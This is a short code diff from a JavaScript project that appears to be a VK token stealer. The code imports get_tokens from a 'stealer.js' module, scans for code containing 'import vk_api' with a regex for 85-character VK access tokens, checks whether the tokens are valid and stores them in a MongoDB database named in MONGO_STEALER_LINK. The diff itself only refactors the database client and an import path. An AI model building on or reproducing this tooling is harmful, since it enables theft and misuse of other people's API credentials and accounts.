@@ -1,12 +1,6 @@
-const MongoClient = require("mongodb").MongoClient;
 const ObjectId = require('mongodb').ObjectID;
-const { get_tokens } = require("../lib/stealer.js");
+const { get_tokens } = require("../../lib/stealer.js");
 const { vk_checker, valid_token } = require("./checker.js");
-
-const client = new MongoClient(
-    process.env.MONGO_STEALER_LINK,
-    { useUnifiedTopology: true },
-);
 
 const db_update = async (collection) => {
     let new_tokens = await get_tokens('import vk_api', /['"]([a-zA-Z0-9]{85})['"]/);
@@ -40,4 +34,4 @@ const db_administration = async (collection) => {
     db_clear(collection).then(console.log("clear db"))
 }
 
-module.exports = { client, ObjectId, db_administration }
+module.exports = { db_administration }
